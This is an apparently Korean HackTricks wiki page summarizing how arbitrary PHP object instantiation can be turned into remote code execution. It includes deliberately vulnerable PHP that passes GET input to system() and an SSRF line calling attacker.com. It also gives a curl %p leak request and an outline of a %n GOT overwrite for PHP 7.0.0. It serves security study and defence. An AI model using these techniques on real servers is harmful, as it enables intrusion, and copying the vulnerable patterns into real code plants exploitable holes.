# PHP - RCE를 악용한 객체 생성: new $_GET["a"]($_GET["b"])

{{#include ../../../banners/hacktricks-training.md}}

이 문서는 기본적으로 [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)의 요약입니다.

## 소개

예를 들어 `new $_GET["a"]($_GET["a"])` 같은 임의 객체 생성은 Remote Code Execution (RCE)로 이어질 수 있으며, 자세한 내용은 [**writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)에 나와 있습니다. 이 문서는 RCE를 달성하기 위한 다양한 전략을 강조합니다.

## 커스텀 클래스 또는 Autoloading을 통한 RCE

문법 `new $a($b)`는 객체를 인스턴스화하는 데 사용되며, **`$a`**는 클래스 이름을 나타내고 **`$b`**는 생성자에 전달되는 첫 번째 인수입니다. 이러한 변수들은 GET/POST 같은 사용자 입력에서 유래할 수 있으며, 문자열이나 배열일 수 있고, JSON에서는 다른 타입으로 나타날 수 있습니다.

아래 코드 스니펫을 고려해 보자:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

class App2 {
function App2 ($cmd) {
system($cmd);
}
}

$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
이 경우 `$a`를 `App` 또는 `App2`로 설정하고 `$b`를 시스템 명령(예: `uname -a`)으로 설정하면 해당 명령이 실행됩니다.

**Autoloading functions**는 해당 클래스에 직접 접근할 수 없는 경우 악용될 수 있습니다. 이 함수들은 필요할 때 파일에서 클래스를 자동으로 로드하며 `spl_autoload_register` 또는 `__autoload`로 정의됩니다:
```php
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

function __autoload($class_name) {
include $class_name . '.php';
};

spl_autoload_register();
```
오토로딩의 동작은 PHP 버전에 따라 달라져 다양한 RCE 가능성을 제공한다.

## RCE via 내장 클래스

커스텀 클래스나 오토로더가 없을 때는 **내장 PHP 클래스**만으로도 RCE가 가능할 수 있다. 이러한 클래스의 수는 PHP 버전과 확장에 따라 대략 100~200개 사이이며, `get_declared_classes()`로 나열할 수 있다.

관심 있는 생성자들은 리플렉션 API를 통해 식별할 수 있다. 예시와 자세한 내용은 다음 예제 및 링크 [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF)를 참조하면 된다.

**RCE via 특정 메서드를 통한 사례에는 다음이 포함된다:**

### **SSRF + Phar Deserialization**

`SplFileObject` 클래스는 생성자를 통해 SSRF를 가능하게 하며, 임의의 URL에 연결할 수 있다:
```php
new SplFileObject('http://attacker.com/');
```
SSRF는 Phar 프로토콜을 사용하여 PHP 8.0 이전 버전에서 deserialization 공격으로 이어질 수 있습니다.

### **Exploiting PDOs**

PDO 클래스 생성자는 DSN 문자열을 통해 데이터베이스에 연결할 수 있게 하며, 잠재적으로 파일 생성이나 기타 상호작용을 가능하게 할 수 있습니다:
```php
new PDO("sqlite:/tmp/test.txt")
```
### **SoapClient/SimpleXMLElement XXE**

libxml2의 버전에 따라, PHP 5.3.22 및 5.4.12까지의 버전은 `SoapClient` 및 `SimpleXMLElement` 생성자를 통해 XXE 공격에 취약했습니다.

## RCE via Imagick Extension

프로젝트의 의존성 분석에서, **Imagick**이 새로운 객체를 인스턴스화함으로써 **command execution**에 이용될 수 있음이 발견되었습니다. 이는 취약점 악용의 기회를 제공합니다.

### VID parser

VID parser가 파일시스템의 임의 경로에 콘텐츠를 쓸 수 있는 기능을 가지고 있음이 확인되었습니다. 이는 웹에서 접근 가능한 디렉터리에 PHP 쉘을 배치하여 Remote Code Execution (RCE)을 달성할 수 있음을 의미합니다.

#### VID Parser + File Upload

PHP가 업로드된 파일을 `/tmp/phpXXXXXX`에 임시 저장한다는 점을 주목하세요. Imagick의 VID parser는 **msl** 프로토콜을 이용해 파일 경로의 와일드카드를 처리할 수 있어, 임시 파일을 특정 위치로 옮기는 것이 가능합니다. 이 방법은 파일시스템 내에서 임의 파일 쓰기를 달성할 수 있는 또 다른 수단을 제공합니다.

### PHP Crash + Brute Force

[**original writeup**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)에 설명된 방법은 삭제되기 전에 서버 크래시를 유발하는 파일을 업로드하는 것을 포함합니다. 임시 파일의 이름을 brute-forcing하면 Imagick이 임의의 PHP 코드를 실행할 수 있게 됩니다. 다만 이 기법은 구버전의 ImageMagick에서만 효과적인 것으로 확인되었습니다.

## Format-string in class-name resolution (PHP 7.0.0 Bug #71105)

사용자 입력이 클래스 이름을 제어할 때(예: `new $_GET['model']()`), PHP 7.0.0은 `Throwable` 리팩터링 과정에서 일시적인 버그를 도입했습니다. 이 버그로 인해 엔진이 클래스 이름을 해석할 때 이를 printf 형식 문자열로 잘못 취급했습니다. 이는 PHP 내부에서 classic printf-style primitives를 가능하게 하여, `%p`를 통한 leaks, 폭(width) 지정자를 이용한 write-count 제어, 그리고 `%n`을 이용한 프로세스 내부 포인터(예: ELF 빌드의 GOT 엔트리)에 대한 arbitrary writes를 허용합니다.

Minimal repro vulnerable pattern:
```php
<?php
$model = $_GET['model'];
$object = new $model();
```
Exploitation outline (from the reference):
- 클래스 이름의 `%p`를 통해 주소를 leak하여 쓰기 가능한 대상(writable target)을 찾음:
```bash
curl "http://host/index.php?model=%p-%p-%p"
# Fatal error includes resolved string with leaked pointers
```
- 정확한 바이트 수를 설정하기 위해 positional parameters와 width specifiers를 사용한 다음, `%n`을 사용해 스택에서 접근 가능한 주소에 그 값을 기록한다. 목표는 GOT 슬롯(예: `free`)을 겨냥해 부분적으로 `system`으로 덮어쓰는 것이다.
- 셸 파이프를 포함한 클래스 이름을 전달해 하이재킹된 함수를 트리거하여 `system("id")`를 호출한다.

Notes:
- PHP 7.0.0에서만 동작함(Bug [#71105](https://bugs.php.net/bug.php?id=71105)); 이후 릴리스에서 수정됨. Severity: critical if arbitrary class instantiation exists.
- 일반적인 페이로드는 여러 `%p`를 연속적으로 사용해 스택을 탐색한 다음, `%.<width>d%<pos>$n`으로 부분 덮어쓰기를 수행한다.

## References

- [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#include ../../../banners/hacktricks-training.md}}
